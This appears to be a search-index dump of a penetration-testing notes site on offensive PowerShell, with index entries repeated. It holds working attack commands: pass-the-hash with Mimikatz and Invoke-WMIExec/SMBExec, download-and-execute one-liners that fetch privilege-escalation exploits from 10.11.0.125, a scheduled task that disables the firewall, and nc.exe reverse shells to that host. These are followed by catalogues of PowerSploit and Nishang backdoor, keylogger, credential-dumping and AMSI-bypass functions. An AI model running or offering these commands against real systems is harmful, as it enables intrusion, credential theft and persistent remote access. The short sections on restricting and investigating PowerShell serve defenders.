exploit / windows / smb / psexec_psh - Payload is encoded - exploit / windows / local / powershell_cmd_upgrade - Upgrade native to Powershell - post / windows / manage / powershell / exec_powershell - exploit / multi / script / web_delivery ## Pass the Hash with Powershell .\\wce.exe \u2013s -c PowerShell.exe Invoke-Mimikatz -Command \"'\"sekurlsa::pth /user:Administrator /domain:. /ntlm: /run:powershell.exe'\"\" http : // www . pwnag3 . com / 2014 / 05 / what - did - microsoft - just - break - with . html ## Persistence - WMI permanent event consumers - Windows registry - Scheduled tasks ## Restricting Powershell - http : // www . darkoperator . com / blog / 2013 / 3 / 21 / powershell - basics - execution - policy - and - code - signing - part - 2 . html - Process tracking and Module logging . - ACL , Software Restriction Policies ( SRP ) and Application Control Policies ( Applocker ) could be used to control PowerShell . - Both aresupported by GPO , your mileage may vary according to your implementation preferences . - ` __PSLockDownPolicy ` ( v3 only ) - Just Enough Admin \u2013 Restrict Administrative Rights - http : // blogs . technet . com / b / privatecloud / archive / 2014 / 05 / 14 / just - enough - administration - step - by - step . aspx - Auditing , Base lining and Incident Management - PoshSec - https : // github . com / PoshSec - Kansa - https : // github . com / davehull / Kansa - Voyeur - https : // github . com / silverhack / voyeur / - Using Virus Total API - https : // github . com / darkoperator / Posh - VirusTotal - Bypassing Applocker Policies - http : // www . sixdub . net / 2014 / 12 / 02 / inexorable - powershell - a - red - teamers - tale - of - overcoming - simple - applocker - policies / - https : // github . com / Veil - Framework / PowerTools / tree / master / PowerPick - Investigating PowerShell attacks https : // www . defcon . org / images / defcon - 22 / dc - 22 - presentations / Kazanciyan - Hastings / DEFCON - 22 - Ryan - Kazanciyan - Matt - Hastings - Investigating - Powershell - Attacks - UPDATED . pdf ## Save output Get-Service | Export-CSV C:\\Temp\\AllServices.CSV \u2013NoTypeInfo Get-User \u2013Filter \u2018Name \u2013Like \u201c*John\u201d\u2019 | Export-CSV C:\\Temp\\AllUsers.CSV \u2013NoTypeInfo Get-ChildItem \u2013Path C:\\Windows\\System32 | Export-CSV C:\\Temp\\AllFiles.CSV -NoTypeInfo - Reboots : ` Get - EventLog \u2013 Log System \u2013 Newest 100 | Where - Object {$ _ . EventID \u2013 eq \u2018 1074 \u2019} | FT MachineName , UserName , TimeGenerated - AutoSize ` - Search hotfix : ` Get - HotFix \u2013 ID KB2877616 ` - Backup Group Policy : ` Backup - GPO \u2013 All \u2013 Path C :\\ Temp \\ AllGPO ` - Check if all DCs are Global Catalog Servers : ` Get - ADDomainController \u2013 Filter * | Select Hostname , IsGlobalCatalog ` - ## Permissions icacls \"C:\\Program Files (x86)\\Program Folder\" OI This folder and files CI This folder and subfolders IO The ACE does not apply to the current file/directory. No output message: This folder only (IO)(CI) This folder, subfolders and files (OI)(CI)(IO) Subfolders and files only (CI)(IO) Subfolders only (OI)(IO) Files only [ https : // docs . microsoft . com / en - us / previous - versions / windows / it - pro / windows - xp / bb490872 ( v = technet . 10 )]( https : // docs . microsoft . com / en - us / previous - versions / windows / it - pro / windows - xp / bb490872 ( v = technet . 10 )) ## Powershell with HID - https : // github . com / samratashok / Kautilya / - http : // www . labofapenetrationtester . com / search / label / Kautilya - http : // www . irongeek . com / i . php ? page = security / plug - and - prey - malicious - usb - devices https : // github . com / subTee / CVE - 2014 - 4113 / blob / master / Invoke - SystemShell . ps1 http : // www . labofapenetrationtester . com / 2014 / 12 / using - nishang - with - cobalt - strike . html http : // blog . cobaltstrike . com / 2014 / 09 / 23 / cobalt - strike - 2 - 1 - i - have - the - powershell / powershell.exe -exec Bypass -C \"IEX (New-Object Net.WebClient).DownloadString(' http://10.11.0.125/PowerUp.ps1 ')\" powershell.exe -exec Bypass -C \"IEX (New-Object Net.WebClient).DownloadString(' http://10.11.0.125/Sherlock.ps1 ')\" powershell.exe -exec Bypass -C \"IEX (New-Object Net.WebClient).DownloadString(' http://10.11.0.125/MS16-032.ps1 ')\" powershell.exe -exec Bypass -C \"IEX (New-Object Net.WebClient).DownloadString(' http://10.11.0.125/MS16-135.ps1 ')\" \\10.11.0.125\\share\\41015.exe \\10.11.0.125\\share\\SetWindowLongPtr_Exploit.exe powershell.exe -exec Bypass -C \"IEX (New-Object Net.WebClient).DownloadString(' http://10.11.0.125/Invoke-WMIExec.ps1 '); Invoke-WMIExec -Target localhost -Username alice -Hash aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE -Command 'cmd' -verbose\" powershell.exe -exec Bypass -C \"IEX (New-Object Net.WebClient).DownloadString(' http://10.11.0.125/Invoke-SMBExec.ps1 '); Invoke-SMBExec -Target localhost -Username alice -Hash aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE -Command 'net localgroup administrators bethany /add' -verbose\" PsExec64.exe \\localhost -u alice -p aliceishere cmd powershell -ExecutionPolicy Bypass C:\\Users\\Bethany\\Desktop\\PsExec.exe -accepteula \\localhost -u alice -p aliceishere cmd powershell.exe -exec Bypass -C \"$action = New-ScheduledTaskAction -Execute netsh -Argument 'firewall set opmode disable'; $trigger = New-ScheduledTaskTrigger -Once -At $startTime -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration ([Timespan]::MaxValue); $settings = New-ScheduledTaskSettingsSet -MultipleInstances Parallel; Register-ScheduledTask -TaskName 'amx1' -TaskPath 'C:\\Windows\\System32\\' -Action $action -Trigger $trigger -User 'alice' -Password 'aliceishere' -Settings $settings\" powershell.exe -exec Bypass -C \"IEX (New-Object Net.WebClient).DownloadString(' http://10.11.0.125/runas.ps1 ')\" cmd /C echo \"aliceishere\" | runas /user:alice \"cmd\" Option explicit dim oShell set oShell= Wscript.CreateObject(\"WScript.Shell\") oShell.Run \"C:\\Users\\Bethany\\Desktop\\nc.exe -e cmd.exe 10.11.0.125 9999\" WScript.Sleep 100 oShell.Sendkeys \"aliceishere~\u201d Wscript.Quit // CScript / WScript $username = 'alice' $password = 'aliceishere' $securePassword = ConvertTo-SecureString $password -AsPlainText -Force $credential = New-Object System.Management.Automation.PSCredential $username, $securepassword Start-Process 'C:\\Users\\Bethany\\Desktop\\nc.exe' -ArgumentList '-e cmd.exe 10.11.0.125 9999' -Credential $credential powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -C \"IEX (New-Object Net.WebClient).DownloadString(' http://10.11.0.125/runas.ps1 ')\" ```","title":"COM Objects"},{"location":"os/windows/powershell/collections/","text":"Collections https://sid-500.com/downloads/ Resource: Infosec PowerShell tools, resources, and authors: https://www.peerlyst.com/posts/resource-infosec-powershell-tools-resources-and-authors?utm_source=twitter utm_medium=social utm_content=peerlyst_post utm_campaign=peerlyst_shared_post Mayhem scripts: https://gist.github.com/M3T4L5T3F Collection of PowerShell network security scripts for system administrators.: https://github.com/thom-s/netsec-ps-scripts","title":"Collections"},{"location":"os/windows/powershell/collections/#collections","text":"https://sid-500.com/downloads/ Resource: Infosec PowerShell tools, resources, and authors: https://www.peerlyst.com/posts/resource-infosec-powershell-tools-resources-and-authors?utm_source=twitter utm_medium=social utm_content=peerlyst_post utm_campaign=peerlyst_shared_post Mayhem scripts: https://gist.github.com/M3T4L5T3F Collection of PowerShell network security scripts for system administrators.: https://github.com/thom-s/netsec-ps-scripts","title":"Collections"},{"location":"os/windows/powershell/modules/","text":"Modules Posh-SecMod https://github.com/darkoperator/Posh-SecMod - PowerShell Module with Security cmdlets for security work Discovery: Perform network discovery. Parse: Parsers for Nmap, DNSRecon and other type of output files from security tools. PostExploitation: Functions to help in performing post exploitation tasks. Registry: Collection of functions for manipulating the registry in remote hosts using WMI. Utilities: General purpose functions. Audit: Functions that may be usful when performing audit of systems. Database: Functions that are useful when interacting with databases. PowerSploit https://github.com/PowerShellMafia/PowerSploit - A PowerShell Post-Exploitation Framework CodeExecution Invoke - DllInjection Injects a Dll into the process ID of your choosing. Invoke - ReflectivePEInjection Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process. Invoke - Shellcode Injects shellcode into the process ID of your choosing or within PowerShell locally . Invoke - WmiCommand Executes a PowerShell ScriptBlock on a target computer and returns its formatted output using WMI as a C2 channel. ScriptModification Out - EncodedCommand Compresses, Base-64 encodes, and generates command-line output for a PowerShell payload script. Out - CompressedDll Compresses, Base-64 encodes, and outputs generated code to load a managed dll in memory. Out - EncryptedScript Encrypts text files/scripts. Remove - Comments Strips comments and extra whitespace from a script. Persistence New - UserPersistenceOption Configure user-level persistence options for the Add-Persistence function. New - ElevatedPersistenceOption Configure elevated persistence options for the Add-Persistence function. Add - Persistence Add persistence capabilities to a script. Install - SSP Installs a security support provider (SSP) dll. Get - SecurityPackages Enumerates all loaded security packages (SSPs). AntivirusBypass Find - AVSignature Locates single Byte AV signatures utilizing the same method as DSplit from \"class101\". Exfiltration Invoke - TokenManipulation Lists available logon tokens. Creates processes with other users logon tokens, and impersonates logon tokens in the current thread. Invoke - TokenManipulation - CreateProcess cmd.exe - Username nt authority\\system GetProcess lass | Invoke - TokenManipulation - ImperrsonateUser Invoke - CredentialInjection Create logons with clear-text credentials without triggering a suspicious Event ID 4648 (Explicit Credential Logon). Invoke - NinjaCopy Copies a file from an NTFS partitioned volume by reading the raw volume and parsing the NTFS structures. Copy from NTDS.dit, SYSTEM, SAM Hive Invoke - Mimikatz Reflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any functionality provided with Mimikatz. Invoke - Mimikatz - DumpCreds Invoke - Mimikatz - DumpCerts Get - Keystrokes Logs keys pressed, time and the active window. Get - GPPPassword Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences. KB2928120 Get - GPPAutologon Retrieves autologon username and password from registry.xml if pushed through Group Policy Preferences. Get - TimedScreenshot A function that takes screenshots at a regular interval and saves them to a folder. New - VolumeShadowCopy Creates a new volume shadow copy. Get - VolumeShadowCopy Lists the device paths of all local volume shadow copies. Mount - VolumeShadowCopy Mounts a volume shadow copy. Remove - VolumeShadowCopy Deletes a volume shadow copy. Get - VaultCredential Displays Windows vault credential objects including cleartext web credentials. Out - Minidump Generates a full-memory minidump of a process. Get - MicrophoneAudio Records audio from system microphone and saves to disk Mayhem Set - MasterBootRecord Proof of concept code that overwrites the master boot record with the message of your choice. Set - CriticalProcess Causes your machine to blue screen upon exiting PowerShell. Privesc PowerUp Clearing house of common privilege escalation checks, along with some weaponization vectors. Service Enumeration: Get - ServiceUnquoted - returns services with unquoted paths that also have a space in the name Get - ModifiableServiceFile - returns services where the current user can write to the service binary path or its config Get - ModifiableService - returns services the current user can modify Get - ServiceDetail - returns detailed information about a specified service Service Abuse: Invoke - ServiceAbuse - modifies a vulnerable service to create a local admin or execute a custom command Write - ServiceBinary - writes out a patched C# service binary that adds a local admin or executes a custom command Install - ServiceBinary - replaces a service binary with one that adds a local admin or executes a custom command Restore - ServiceBinary - restores a replaced service binary with the original executable DLL Hijacking: Find - ProcessDLLHijack - finds potential DLL hijacking opportunities for currently running processes Find - PathDLLHijack - finds service %PATH% DLL hijacking opportunities Write - HijackDll - writes out a hijackable DLL Registry Checks: Get - RegistryAlwaysInstallElevated - checks if the AlwaysInstallElevated registry key is set Get - RegistryAutoLogon - checks for Autologon credentials in the registry Get - ModifiableRegistryAutoRun - checks for any modifiable binaries/scripts (or their configs) in HKLM autoruns Miscellaneous Checks: Get - ModifiableScheduledTaskFile - find schtasks with modifiable target files Get - UnattendedInstallFile - finds remaining unattended installation files Get - Webconfig - checks for any encrypted web.config strings Get - ApplicationHost - checks for encrypted application pool and virtual directory passwords Get - SiteListPassword - retrieves the plaintext passwords for any found McAfee's SiteList.xml files Get - CachedGPPPassword - checks for passwords in cached Group Policy Preferences files Other Helpers/Meta-Functions: Get - ModifiablePath - tokenizes an input string and returns the files in it the current user can modify Get - CurrentUserTokenGroupSid - returns all SIDs that the current user is a part of, whether they are disabled or not Add - ServiceDacl - adds a Dacl field to a service object returned by Get-Service Set - ServiceBinPath - sets the binary path for a service to a specified value through Win32 API methods Test - ServiceDaclPermission - tests one or more passed services or service names against a given permission set Write - UserAddMSI - write out a MSI installer that prompts for a user to be added Invoke - AllChecks - runs all current escalation checks and returns a report Recon Invoke - Portscan Does a simple port scan using regular sockets, based (pretty) loosely on nmap. Get - HttpStatus Returns the HTTP Status Codes and full URL for specified paths when provided with a dictionary file. Invoke - ReverseDnsLookup Scans an IP address range for DNS PTR records. PowerView PowerView is series of functions that performs network and Windows domain enumeration and exploitation. Misc Export - PowerViewCSV - thread-safe CSV append Set - MacAttribute - Sets MAC attributes for a file based on another file or input (from Powersploit) Copy - ClonedFile - copies a local file to a remote location, matching MAC properties Get - IPAddress - resolves a hostname to an IP Test - Server - tests connectivity to a specified server Convert - NameToSid - converts a given user/group name to a security identifier (SID) Convert - SidToName - converts a security identifier (SID) to a group/user name Convert - NT4toCanonical - converts a user/group NT4 name (i.e. dev/john) to canonical format Get - Proxy - enumerates local proxy settings Get - PathAcl - get the ACLs for a local/remote file path with optional group recursion Get - UserProperty - returns all properties specified for users, or a set of user:prop names Get - ComputerProperty - returns all properties specified for computers, or a set of computer:prop names Find - InterestingFile - search a local or remote path for files with specific terms in the name Invoke - CheckLocalAdminAccess - check if the current user context has local administrator access to a specified host Get - DomainSearcher - builds a proper ADSI searcher object for a given domain Get - ObjectAcl - returns the ACLs associated with a specific active directory object Add - ObjectAcl - adds an ACL to a specified active directory object Get - LastLoggedOn - return the last logged on user for a target host Get - CachedRDPConnection - queries all saved RDP connection entries on a target host Invoke - ACLScanner - enumerate -1000+ modifable ACLs on a specified domain Get - GUIDMap - returns a hash table of current GUIDs - display names Get - DomainSID - return the SID for the specified domain Invoke - ThreadedFunction - helper that wraps threaded invocation for other net * Functions: Get - NetDomain - gets the name of the current user's domain Get - NetForest - gets the forest associated with the current user's domain Get - NetForestDomain - gets all domains for the current forest Get - NetDomainController - gets the domain controllers for the current computer's domain Get - NetUser - returns all user objects, or the user specified (wildcard specifiable) Add - NetUser - adds a local or domain user Get - NetComputer - gets a list of all current servers in the domain Get - NetPrinter - gets an array of all current computers objects in a domain Get - NetOU - gets data for domain organization units Get - NetSite - gets current sites in a domain Get - NetSubnet - gets registered subnets for a domain Get - NetGroup - gets a list of all current groups in a domain Get - NetGroupMember - gets a list of all current users in a specified domain group Get - NetLocalGroup - gets the members of a localgroup on a remote host or hosts Add - NetGroupUser - adds a local or domain user to a local or domain group Get - NetFileServer - get a list of file servers used by current domain users Get - DFSshare - gets a list of all distribute file system shares on a domain Get - NetShare - gets share information for a specified server Get - NetLoggedon - gets users actively logged onto a specified server Get - NetSession - gets active sessions on a specified server Get - NetRDPSession - gets active RDP sessions for a specified server (like qwinsta) Get - NetProcess - gets the remote processes and owners on a remote server Get - UserEvent - returns logon or TGT events from the event log for a specified host Get - ADObject - takes a domain SID and returns the user, group, or computer object associated with it Set - ADObject - takes a SID, name, or SamAccountName to query for a specified domain object, and then sets a specified 'PropertyName' to a specified 'PropertyValue' GPO functions: Get - GptTmpl - parses a GptTmpl.inf to a custom object Get - NetGPO - gets all current GPOs for a given domain Get - NetGPOGroup - gets all GPOs in a domain that set \"Restricted Groups\" on on target machines Find - GPOLocation - takes a user/group and makes machines they have effective rights over through GPO enumeration and correlation Find - GPOComputerAdmin - takes a computer and determines who has admin rights over it through GPO enumeration Get - DomainPolicy - returns the default domain or DC policy User-Hunting Functions: Invoke - UserHunter - finds machines on the local domain where specified users are logged into, and can optionally check if the current user has local admin access to found machines Invoke - StealthUserHunter - finds all file servers utilizes in user HomeDirectories, and checks the sessions one each file server, hunting for particular users Invoke - ProcessHunter - hunts for processes with a specific name or owned by a specific user on domain machines Invoke - UserEventHunter - hunts for user logon events in domain controller event logs Domain Trust Functions: Get - NetDomainTrust - gets all trusts for the current user's domain Get - NetForestTrust - gets all trusts for the forest associated with the current user's domain Find - ForeignUser - enumerates users who are in groups outside of their principal domain Find - ForeignGroup - enumerates all the members of a domain's groups and finds users that are outside of the queried domain Invoke - MapDomainTrust - try to build a relational mapping of all domain trusts MetaFunctions: Invoke - ShareFinder - finds (non-standard) shares on hosts in the local domain Invoke - FileFinder - finds potentially sensitive files on hosts in the local domain Find - LocalAdminAccess - finds machines on the domain that the current user has local admin access to Find - ManagedSecurityGroups - searches for active directory security groups which are managed and identify users who have write access to those groups (i.e. the ability to add or remove members) Find - UserField - searches a user field for a particular term Find - ComputerField - searches a computer field for a particular term Get - ExploitableSystem - finds systems likely vulnerable to common exploits Invoke - EnumerateLocalAdmin - enumerates members of the local Administrators groups across all machines in the domain Nishang https://github.com/samratashok/nishang - framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming ActiveDirectory Set-DCShadowPermissions Modify AD objects to provide minimal permissions required for DCShadow. Antak - the Webshell Antak Execute PowerShell scripts in memory, run commands, and download and upload files using this webshell. Backdoors HTTP-Backdoor A backdoor which can receive instructions from third party websites and execute PowerShell scripts in memory. DNS_TXT_Pwnage A backdoor which can receive commands and PowerShell scripts from DNS TXT queries, execute them on a target, and be remotely controlled using the queries. Execute-OnTime A backdoor which can execute PowerShell scripts at a given time on a target. Gupt-Backdoor A backdoor which can receive commands and scripts from a WLAN SSID without connecting to it. Add-ScrnSaveBackdoor A backdoor which can use Windows screen saver for remote command and script execution. Invoke-ADSBackdoor A backdoor which can use alternate data streams and Windows Registry to achieve persistence. Add-RegBackdoor A backdoor which uses well known Debugger trick to execute payload with Sticky keys and Utilman (Windows key + U). Set-RemoteWMI Modify permissions of DCOM and WMI namespaces to allow access to a non-admin user. Set-RemotePSRemoting Modify permissions of PowerShell remoting to allow access to a non-admin user. Bypass Invoke-AmsiBypass Implementation of publicly known methods to bypass/avoid AMSI. Client Out-CHM Create infected CHM files which can execute PowerShell commands and scripts. Out-Word Create Word files and infect existing ones to run PowerShell commands and scripts. Out-Excel Create Excel files and infect existing ones to run PowerShell commands and scripts. Out-HTA Create a HTA file which can be deployed on a web server and used in phishing campaigns. Out-Java Create signed JAR files which can be used with applets for script and command execution. Out-Shortcut Create shortcut files capable of executing PowerShell commands and scripts. Out-WebQuery Create IQY files for phishing credentials and SMB hashes. Out-JS Create JS files capable of executing PowerShell commands and scripts. Out-SCT Create SCT files capable of executing PowerShell commands and scripts. Out-SCF Create a SCF file which can be used for capturing NTLM hash challenges. Escalation Enable-DuplicateToken When SYSTEM privileges are required. Remove-Update Introduce vulnerabilities by removing patches. Invoke-PsUACme Bypass UAC. Execution Download-Execute-PS Download and execute a PowerShell script in memory. Download_Execute Download an executable in text format, convert it to an executable, and execute. Execute-Command-MSSQL Run PowerShell commands, native commands, or SQL commands on a MSSQL Server with sufficient privileges. Execute-DNSTXT-Code Execute shellcode in memory using DNS TXT queries. Out-RundllCommand Execute PowerShell commands and scripts or a reverse PowerShell session using rundll32.exe. Gather Check-VM Check for a virtual machine. Copy-VSS Copy the SAM file using Volume Shadow Copy Service. Invoke-CredentialsPhish Trick a user into giving credentials in plain text. FireBuster FireListener A pair of scripts for egress testing Get-Information Get juicy information from a target. Get-LSASecret Get LSA Secret from a target. Get-PassHashes Get password hashes from a target. Get-WLAN-Keys Get WLAN keys in plain text from a target. Keylogger Log keystrokes from a target. Invoke-MimikatzWdigestDowngrade Dump user passwords in plain on Windows 8.1 and Server 2012 Get-PassHints Get password hints of Windows users from a target. Show-TargetScreen Connect back and Stream target screen using MJPEG. Invoke-Mimikatz Load mimikatz in memory. Updated and with some customisation. Invoke-Mimikittenz Extract juicy information from target process (like browsers) memory using regex. Invoke-SSIDExfil Exfiltrate information like user credentials, using WLAN SSID. Invoke-SessionGopher Identify admin jump-boxes and/or computers used to access Unix machines. Extract information from Putty and RDP (ppk, rdp, stdid) Decrypt passwords for WinSCP from registry \"Admin\" required for remote operations \"-ExcludeDc\" to prevent detection MITM Invoke-Interceptor A local HTTPS proxy for MITM attacks. Pivot Create-MultipleSessions Check credentials on multiple computers and create PSSessions. Run-EXEonRemote Copy and execute an executable on multiple machines. Invoke-NetworkRelay Create network relays between computers. Prasadhak Prasadhak Check running hashes of running process against the VirusTotal database. Scan Brute-Force Brute force FTP, Active Directory, MSSQL, and Sharepoint. Port-Scan A handy port scanner. Powerpreter Powerpreter All the functionality of nishang in a single script module. Shells Invoke-PsGcat Send commands and scripts to specifed Gmail account to be executed by Invoke-PsGcatAgent Invoke-PsGcatAgent Execute commands and scripts sent by Invoke-PsGcat. Invoke-PowerShellTcp An interactive PowerShell reverse connect or bind shell Invoke-PowerShellTcpOneLine Stripped down version of Invoke-PowerShellTcp. Also contains, a skeleton version which could fit in two tweets. Invoke-PowerShellTcpOneLineBind Bind version of Invoke-PowerShellTcpOneLine. Invoke-PowerShellUdp An interactive PowerShell reverse connect or bind shell over UDP Invoke-PowerShellUdpOneLine Stripped down version of Invoke-PowerShellUdp. Invoke-PoshRatHttps Reverse interactive PowerShell over HTTPS. Invoke-PoshRatHttp Reverse interactive PowerShell over HTTP. Remove-PoshRat Clean the system after using Invoke-PoshRatHttps Invoke-PowerShellWmi Interactive PowerShell using WMI. Invoke-PowerShellIcmp An interactive PowerShell reverse shell over ICMP. Invoke-JSRatRundll An interactive PowerShell reverse shell over HTTP using rundll32.exe. Invoke-JSRatRegsvr An interactive PowerShell reverse shell over HTTP using regsvr32.exe. Utility Add-Exfiltration Add data exfiltration capability to Gmail, Pastebin, a web server, and DNS to any script. Add-Persistence Add reboot persistence capability to a script. Remove-Persistence Remote persistence added by the Add-Persistence script. Do-Exfiltration Pipe (|) this to any script to exfiltrate the output. Download Transfer a file to the target. Parse_Keys Parse keys logged by the keylogger. Invoke-Encode Encode and compress a script or string. Invoke-Decode Decode and decompress a script or string from Invoke-Encode. Start-CaptureServer Run a web server which logs Basic authentication and SMB hashes. ConvertTo-ROT13 Encode a string to ROT13 or decode a ROT13 string. Out-DnsTxt Generate DNS TXT records which could be used with other scripts. External Services https://github.com/darkoperator/Posh-Shodan](https://github.com/darkoperator/Posh-Shodan ) - PowerShell Module to interact with the Shodan service Scaning https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1 https://github.com/samratashok/nishang/blob/master/Scan/Invoke-PortScan.ps1 Parse Nmap Reports: https://github.com/SamuelArnold/StarKill3r/blob/master/Star%20Killer/Star%20Killer/bin/Debug/Scripts/SANS-SEC505-master/scripts/Day1-PowerShell/Parse-Nmap.ps1 Paser Nessus Reports: https://github.com/darkoperator/Posh-NVS https://github.com/hardwaterhacker/scandiff - Scandiff is a PowerShell script to automate host discovery and scanning with nmap. After discovering and scanning hosts, scandiff performs an nmap ndiff on the output against previous results, 7zips all generated output, and optionally emails all output to a specified email address. Brute Forcing Active DIrectory brute forcing: https://github.com/samratashok/nishang/blob/master/Scan/Invoke-BruteForce.ps1 https://github.com/NetSPI/PowerShell/blob/master/Invoke-ExternalDomainBruteforce.ps1 Get-WinRMPassword - https://poshsecurity.com/blog/2014/3/20/powershell-winrm-get-winrmpassword.html Get-WimPassword Database Attacks PowerUpSQL - Toolkit for Attacking SQL Server: https://github.com/NetSPI/PowerUpSQL Execute command over MSSQL: Nishang/Execute-Command-MSSQL.ps1 Encoding Payloads https://github.com/samratashok/nishang/blob/master/Utility/Invoke-Encode.ps1 Capture NTLM https://github.com/Kevin-Robertson/Inveigh Obfuscation https://github.com/danielbohannon/Invoke-Obfuscation https://github.com/danielbohannon/Invoke-DOSfuscation Fileless Malware Invoke-NoShell outputs a Microsoft Office Word .doc file with an embedded macro: https://github.com/G4lB1t/Invoke-NoShell","title":"Modules"},{"location":"os/windows/powershell/modules/#modules","text":"","title":"Modules"},{"location":"os/windows/powershell/modules/#posh-secmod","text":"https://github.com/darkoperator/Posh-SecMod - PowerShell Module with Security cmdlets for security work Discovery: Perform network discovery. Parse: Parsers for Nmap, DNSRecon and other type of output files from security tools. PostExploitation: Functions to help in performing post exploitation tasks. Registry: Collection of functions for manipulating the registry in remote hosts using WMI. Utilities: General purpose functions. Audit: Functions that may be usful when performing audit of systems. Database: Functions that are useful when interacting with databases.","title":"Posh-SecMod"},{"location":"os/windows/powershell/modules/#powersploit","text":"https://github.com/PowerShellMafia/PowerSploit - A PowerShell Post-Exploitation Framework CodeExecution Invoke - DllInjection Injects a Dll into the process ID of your choosing. Invoke - ReflectivePEInjection Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process. Invoke - Shellcode Injects shellcode into the process ID of your choosing or within PowerShell locally . Invoke - WmiCommand Executes a PowerShell ScriptBlock on a target computer and returns its formatted output using WMI as a C2 channel. ScriptModification Out - EncodedCommand Compresses, Base-64 encodes, and generates command-line output for a PowerShell payload script. Out - CompressedDll Compresses, Base-64 encodes, and outputs generated code to load a managed dll in memory. Out - EncryptedScript Encrypts text files/scripts. Remove - Comments Strips comments and extra whitespace from a script. Persistence New - UserPersistenceOption Configure user-level persistence options for the Add-Persistence function. New - ElevatedPersistenceOption Configure elevated persistence options for the Add-Persistence function. Add - Persistence Add persistence capabilities to a script. Install - SSP Installs a security support provider (SSP) dll. Get - SecurityPackages Enumerates all loaded security packages (SSPs). AntivirusBypass Find - AVSignature Locates single Byte AV signatures utilizing the same method as DSplit from \"class101\". Exfiltration Invoke - TokenManipulation Lists available logon tokens. Creates processes with other users logon tokens, and impersonates logon tokens in the current thread. Invoke - TokenManipulation - CreateProcess cmd.exe - Username nt authority\\system GetProcess lass | Invoke - TokenManipulation - ImperrsonateUser Invoke - CredentialInjection Create logons with clear-text credentials without triggering a suspicious Event ID 4648 (Explicit Credential Logon). Invoke - NinjaCopy Copies a file from an NTFS partitioned volume by reading the raw volume and parsing the NTFS structures. Copy from NTDS.dit, SYSTEM, SAM Hive Invoke - Mimikatz Reflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any functionality provided with Mimikatz. Invoke - Mimikatz - DumpCreds Invoke - Mimikatz - DumpCerts Get - Keystrokes Logs keys pressed, time and the active window. Get - GPPPassword Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences. KB2928120 Get - GPPAutologon Retrieves autologon username and password from registry.xml if pushed through Group Policy Preferences. Get - TimedScreenshot A function that takes screenshots at a regular interval and saves them to a folder. New - VolumeShadowCopy Creates a new volume shadow copy. Get - VolumeShadowCopy Lists the device paths of all local volume shadow copies. Mount - VolumeShadowCopy Mounts a volume shadow copy. Remove - VolumeShadowCopy Deletes a volume shadow copy. Get - VaultCredential Displays Windows vault credential objects including cleartext web credentials. Out - Minidump Generates a full-memory minidump of a process. Get - MicrophoneAudio Records audio from system microphone and saves to disk Mayhem Set - MasterBootRecord Proof of concept code that overwrites the master boot record with the message of your choice. Set - CriticalProcess Causes your machine to blue screen upon exiting PowerShell. Privesc PowerUp Clearing house of common privilege escalation checks, along with some weaponization vectors. Service Enumeration: Get - ServiceUnquoted - returns services with unquoted paths that also have a space in the name Get - ModifiableServiceFile - returns services where the current user can write to the service binary path or its config Get - ModifiableService - returns services the current user can modify Get - ServiceDetail - returns detailed information about a specified service Service Abuse: Invoke - ServiceAbuse - modifies a vulnerable service to create a local admin or execute a custom command Write - ServiceBinary - writes out a patched C# service binary that adds a local admin or executes a custom command Install - ServiceBinary - replaces a service binary with one that adds a local admin or executes a custom command Restore - ServiceBinary - restores a replaced service binary with the original executable DLL Hijacking: Find - ProcessDLLHijack - finds potential DLL hijacking opportunities for currently running processes Find - PathDLLHijack - finds service %PATH% DLL hijacking opportunities Write - HijackDll - writes out a hijackable DLL Registry Checks: Get - RegistryAlwaysInstallElevated - checks if the AlwaysInstallElevated registry key is set Get - RegistryAutoLogon - checks for Autologon credentials in the registry Get - ModifiableRegistryAutoRun - checks for any modifiable binaries/scripts (or their configs) in HKLM autoruns Miscellaneous Checks: Get - ModifiableScheduledTaskFile - find schtasks with modifiable target files Get - UnattendedInstallFile - finds remaining unattended installation files Get - Webconfig - checks for any encrypted web.config strings Get - ApplicationHost - checks for encrypted application pool and virtual directory passwords Get - SiteListPassword - retrieves the plaintext passwords for any found McAfee's SiteList.xml files Get - CachedGPPPassword - checks for passwords in cached Group Policy Preferences files Other Helpers/Meta-Functions: Get - ModifiablePath - tokenizes an input string and returns the files in it the current user can modify Get - CurrentUserTokenGroupSid - returns all SIDs that the current user is a part of, whether they are disabled or not Add - ServiceDacl - adds a Dacl field to a service object returned by Get-Service Set - ServiceBinPath - sets the binary path for a service to a specified value through Win32 API methods Test - ServiceDaclPermission - tests one or more passed services or service names against a given permission set Write - UserAddMSI - write out a MSI installer that prompts for a user to be added Invoke - AllChecks - runs all current escalation checks and returns a report Recon Invoke - Portscan Does a simple port scan using regular sockets, based (pretty) loosely on nmap. Get - HttpStatus Returns the HTTP Status Codes and full URL for specified paths when provided with a dictionary file. Invoke - ReverseDnsLookup Scans an IP address range for DNS PTR records. PowerView PowerView is series of functions that performs network and Windows domain enumeration and exploitation. Misc Export - PowerViewCSV - thread-safe CSV append Set - MacAttribute - Sets MAC attributes for a file based on another file or input (from Powersploit) Copy - ClonedFile - copies a local file to a remote location, matching MAC properties Get - IPAddress - resolves a hostname to an IP Test - Server - tests connectivity to a specified server Convert - NameToSid - converts a given user/group name to a security identifier (SID) Convert - SidToName - converts a security identifier (SID) to a group/user name Convert - NT4toCanonical - converts a user/group NT4 name (i.e. dev/john) to canonical format Get - Proxy - enumerates local proxy settings Get - PathAcl - get the ACLs for a local/remote file path with optional group recursion Get - UserProperty - returns all properties specified for users, or a set of user:prop names Get - ComputerProperty - returns all properties specified for computers, or a set of computer:prop names Find - InterestingFile - search a local or remote path for files with specific terms in the name Invoke - CheckLocalAdminAccess - check if the current user context has local administrator access to a specified host Get - DomainSearcher - builds a proper ADSI searcher object for a given domain Get - ObjectAcl - returns the ACLs associated with a specific active directory object Add - ObjectAcl - adds an ACL to 